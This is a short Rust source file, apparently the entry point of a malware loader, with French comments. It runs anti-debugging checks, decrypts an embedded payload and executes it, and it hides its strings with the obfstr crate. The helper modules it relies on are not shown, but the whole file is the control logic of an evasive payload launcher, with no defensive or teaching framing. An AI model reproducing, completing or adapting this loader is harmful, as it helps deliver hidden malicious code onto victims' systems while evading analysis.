#![allow(unsafe_op_in_unsafe_fn)]
#![allow(unused_imports)]
#![allow(non_snake_case)]

use obfstr::obfstr;
mod anti_debug;
mod config;
mod payload;
mod loader;
mod utils;
mod cypher;

fn main() {
    // Enti-Debug
    let corrupted_mode = anti_debug::run_all_checks();

    // Extraction & Déchiffrement
    if let Some(decrypted_payload) = payload::extract_and_decrypt(corrupted_mode) {
        // Exécution
        loader::execute(decrypted_payload);
    } else {
        println!("{}", obfstr!("[-] Payload introuvable !"));
        let mut s = String::new();
        std::io::stdin().read_line(&mut s).unwrap();
        std::process::exit(0);
    }
}
